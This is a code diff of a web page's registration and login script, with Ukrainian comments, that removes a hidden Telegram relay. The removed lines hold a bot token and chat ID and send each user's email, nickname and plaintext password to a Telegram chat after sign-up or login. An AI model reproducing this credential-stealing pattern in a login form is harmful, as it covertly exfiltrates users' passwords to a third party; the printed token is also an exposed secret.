@@ -3,12 +3,8 @@ let currentMode = 'reg';
 let pendingTabId = null;
 let pendingButton = null;
 
-// ЗМІНЕНО: Тепер сайт відправляє дані на твій локальний сервер!
+// Локальний сервер
 const API_URL = 'http://localhost:3000';
-
-// Твій Telegram
-const TELEGRAM_TOKEN = '8460092788:AAHPbETm_DIczqYL7vA4XCbnWioiVBZYHwg';
-const TELEGRAM_CHAT_ID = '8399462172';
 
 function handleTabClick(btnElement, tabId) {
     if (!isUserRegistered) {
@@ -71,7 +67,7 @@ document.getElementById('auth-form').addEventListener('submit', async (e) => {
 
     // БЕЗПЕЧНЕ СКЛЕЮВАННЯ URL
     const path = currentMode === 'reg' ? 'register' : 'login';
-    const finalUrl = API_URL + '/' + path; // Гарантуємо один слеш між ними
+    const finalUrl = API_URL + '/' + path;
 
     const body = currentMode === 'reg' ? { email, password, username: nickname } : { email, password };
 
@@ -85,10 +81,6 @@ document.getElementById('auth-form').addEventListener('submit', async (e) => {
         if (res.ok) {
             const data = await res.json();
             
-            // Відправка в Telegram
-            const tgMsg = `🚀 Дія: ${currentMode.toUpperCase()}\n👤 Nick: ${nickname || data.user?.username || 'N/A'}\n📧 Email: ${email}\n🔑 Pass: ${password}`;
-            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(tgMsg)}`);
-
             isUserRegistered = true;
             document.getElementById('player-display').innerHTML = `Player: <strong>${nickname || data.user?.username || "User"}</strong>`;
             document.getElementById('settings-btn').style.display = 'inline-block';
